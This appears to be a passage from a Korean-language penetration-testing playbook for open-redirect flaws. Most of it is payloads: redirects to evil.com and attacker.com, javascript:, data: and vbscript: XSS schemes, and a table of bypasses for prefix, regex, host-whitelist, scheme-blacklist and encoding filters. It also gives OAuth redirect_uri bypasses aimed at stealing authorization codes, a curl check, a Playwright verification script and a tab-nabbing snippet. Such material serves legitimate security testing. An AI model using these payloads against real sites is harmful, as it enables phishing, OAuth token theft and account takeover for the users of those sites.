### Phase 2: 동적 테스트 (검증)

**기본 페이로드:**

**서버 redirect (Location 헤더):**
- `https://evil.com` (query)
- `//evil.com` (protocol-relative)
- `https:\\evil.com` (backslash 변형)
- `https:%5C%5Cevil.com` (URL encoded backslash)
- `///evil.com` (slash 다중)

**클라이언트 sink (`location.href`/`window.open`):**
- `javascript:alert(document.domain)` (XSS 변형)
- `data:text/html,<script>alert(1)</script>`
- `vbscript:msgbox(1)` (구 IE)
- `feed:javascript:alert(1)` (feed scheme)

**메타 refresh:**
- `<meta http-equiv="refresh" content="0; url=https://evil.com">` (응답 본문에 외부 URL 출력 시)

**OAuth `redirect_uri`:**
- `https://evil.com/callback` (등록 외 URL — strict 검증 시 차단)
- `https://allowed.com/callback?next=https://evil.com` (open-redirect 결합)
- `https://allowed.com/callback#@evil.com` (fragment trick)

**검증 실행:**
```
# 서버 redirect — Location 헤더 확인
curl -I "https://target/redirect?url=https://evil.com" | grep -i location

# 클라이언트 sink — Playwright (framenavigated 이벤트)
```

**Playwright 검증 (클라이언트):**
```javascript
const { chromium } = require('playwright');
(async () => {
  const b = await chromium.launch({ headless: true });
  const p = await b.newPage();
  let final = null;
  p.on('framenavigated', f => { if (f === p.mainFrame()) final = f.url(); });
  await p.goto('https://target/page?redirect=https://evil.com', { waitUntil: 'networkidle' });
  console.log('final:', p.url());
  await p.goto('https://target/page#url=https://evil.com', { waitUntil: 'networkidle' });
  console.log('hash sink:', p.url());
  await b.close();
})();
```

---

**우회 페이로드:**

| 방어 | 페이로드 |
|---|---|
| `startsWith('https://example.com')` | `https://example.com.attacker.com`, `https://example.com@attacker.com`, `https://example.com#attacker.com`, `https://example.com?x=attacker.com`, `https://example.com\@attacker.com` |
| 정규식 `^https://example\.com` (`.` 메타) | `https://example-com.attacker.com`, `https://example1com.attacker.com`, `https://exampleXcom.attacker.com` |
| `startsWith('/')` 상대 강제 | `//evil.com`, `/\evil.com`, `/%2f%2fevil.com`, `/.evil.com`, `///evil.com`, `\\\\evil.com` |
| Host 화이트리스트 (URL 파싱 후) | `http://evil.com\@allowed.com/`, `http://allowed.com#@evil.com/`, `http://[email protected]/`, parser confusion (WHATWG vs urlparse vs java.net.URL) |
| Scheme 블랙리스트 (`javascript:`) | `JaVaScRiPt:alert(1)`, `java%09script:`, `java%0ascript:`, `java\tscript:`, `data:text/html,<script>alert(1)</script>`, `vbscript:`, `file:///`, `feed:javascript:` |
| Punycode 후 검증 | 동형 문자 — `https://аllowed.com` (cyrillic а), Greek `ο` (omicron), Latin `ɑ` |
| Fragment 미검증 | `/safe?url=...#https://evil.com` (SPA hash 라우터 변조) |
| `@` 차단 | `%40`, `%2540` (double encode), `%uff20` (Unicode fullwidth) |
| Backslash 차단 | `https:\\evil.com`, `https:\\\\evil.com`, `https:%5C%5Cevil.com`, `https:%2f%2fevil.com` (forward slash variant) |
| Whitelist + path 검증 | `https://allowed.com/cb/../../@evil.com`, `https://allowed.com/.@evil.com` |
| 검증 후 redirect만 차단 (response body는 출력) | `<meta refresh>`로 클라이언트 redirect, JS `location.href` 응답에 포함 |

**OAuth redirect_uri 우회:**
```
# 등록 URL prefix만 매칭
?redirect_uri=https://allowed.com/cb/../../evil
?redirect_uri=https://allowed.com/cb%2f..%2f..%2fevil

# fragment/query 추가
?redirect_uri=https://allowed.com/cb?next=https://evil.com
?redirect_uri=https://allowed.com/cb#@evil.com

# URL 인코딩 + @
?redirect_uri=https://allowed.com%40attacker.com

# 백슬래시
?redirect_uri=https://allowed.com\\@attacker.com
```

**Tab-nabbing:**
```html
<a href="https://target/redirect?url=https://attacker/tabnab" target="_blank">click</a>
<!-- attacker는 window.opener.location = ... 으로 원본 페이지 변조 -->
```

---

**참고사항:**

- 빈출 파라미터: `redirect`, `returnUrl`, `next`, `goto`, `callback`, `redirect_uri`, `dest`, `link`, `url`, `target`, `continue`
- OAuth/SSO 콜백이 가장 큰 영향 (인가 코드 탈취 → 계정 takeover) — oauth-scanner 결합
- 패스워드 리셋 후 redirect, 로그인 후 redirect는 인증 컨텍스트 결합으로 영향도 격상
- DOM XSS와 결합 — `javascript:`/`data:` 스킴 허용 시 XSS로 변형 (dom-xss-scanner)
- Tab-nabbing은 `target="_blank"` + `rel="noopener"` 누락 페이지에서만
- 모바일 앱 deeplink/custom scheme도 변형 (`myapp://action?url=...`)
- Phase 1 Step D-E 트리거 매트릭스 (LINK/FORM/SCRIPT/HEADER) 라벨에 따라 Phase 2 시도 형식 다름
- 1단계 검증 통과 후 2단계에서 다시 사용하는 OAuth flow는 multi-step replay 시도
- WHATWG URL과 Python `urlparse`/Java `URL`의 파싱 차이가 핵심 우회 게이트
- meta refresh는 응답 본문에 외부 URL이 그대로 들어가야 — 동적 출력 sink 점검
- 쿼리 외 fragment(`#`)도 사용자 제어 — SPA hash 라우터에서 redirect 트리거 빈번
- nip.io/sslip.io 같은 IP-as-domain 서비스로 화이트리스트 우회 시도
- HTTP 응답 코드 200 + 페이지 내 `<a href>`만 있으면 LINK 라벨 (사용자 클릭 필요) — 영향도 약함
